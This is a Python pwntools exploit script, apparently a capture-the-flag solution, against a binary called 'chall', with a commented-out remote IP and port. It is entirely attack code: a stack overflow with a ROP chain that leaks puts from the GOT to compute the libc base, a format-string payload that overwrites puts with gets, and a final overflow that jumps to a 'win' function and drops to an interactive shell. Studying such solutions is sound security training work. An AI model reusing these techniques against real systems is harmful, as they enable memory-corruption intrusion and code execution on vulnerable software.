from pwn import *

BINARY = "chall"
LIBC = "libc.so.6"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)
libc = ELF(LIBC)

# p = remote("34.76.206.46", 10005)
p = elf.process()

p.sendlineafter(b"your name: ", b"Ramesh")
p.sendlineafter(b"what you would like to do: ", b"2")

# First, leak libc base and rebase libc
OFFSET = 120

payload = flat(
    cyclic(OFFSET),
    p64(rop.find_gadget(["ret"]).address),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(elf.got["puts"]),
    p64(elf.plt["puts"]),
    p64(elf.symbols["you_cant_see_me"])
)

p.sendlineafter(b"lucky one ;): ", payload)

LEAK = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"puts address -> {hex(LEAK)}")

LIBC_BASE =  LEAK - libc.symbols["puts"]
log.info(f"libc base -> {hex(LIBC_BASE)}")

libc.address = LIBC_BASE


# Now, GOT overwrite, change puts to gets
payload = fmtstr_payload(6, {elf.got['puts'] : libc.symbols["gets"]})
p.sendlineafter(b"are you?\n", payload)

payload = flat(
    cyclic(40),
    elf.symbols["win"]
)

p.sendlineafter(b"s33 me!\n", payload)

p.interactive()
p.close()